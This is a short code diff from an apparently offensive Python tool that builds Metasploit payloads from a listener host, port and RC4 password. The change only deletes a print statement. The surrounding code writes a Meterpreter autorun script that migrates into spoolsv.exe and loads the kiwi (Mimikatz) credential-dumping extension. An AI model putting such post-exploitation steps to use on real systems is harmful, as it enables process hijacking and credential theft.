@@ -48,7 +48,6 @@ def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
 		sys.stdout.write("Please respond with 'ON' or 'OFF'")
 
 def autorunscript():
-	print('Create autorunscript')
 	with open(fileAutoscript, 'w') as f1:
 		f1.write("migrate -N spoolsv.exe\n"+\
 				 "load kiwi\n"+\
